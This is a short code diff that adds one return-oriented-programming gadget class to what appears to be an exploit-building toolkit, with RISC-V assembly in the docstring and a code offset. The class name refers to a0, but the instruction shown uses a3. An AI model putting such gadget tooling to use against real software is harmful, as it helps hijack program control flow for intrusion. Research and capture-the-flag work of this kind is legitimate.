@@ -95,6 +95,18 @@ class MovA0_S0(ROP_Gadget):
     def __init__(self):
         super().__init__(0x1484c)
 
+class AndA0_S0(ROP_Gadget):
+    '''
+    and	a3, a3, s0
+    ld ra, 0x18(sp)
+    ld s0, 0x10(sp)
+    ld s1, 0x8(sp)
+    addi sp, sp, 0x20
+    jr ra
+    '''
+    def __init__(self):
+        super().__init__(0x224f0)
+
 class MovS0_A0(ROP_Gadget):
     '''
     mv s0, a0
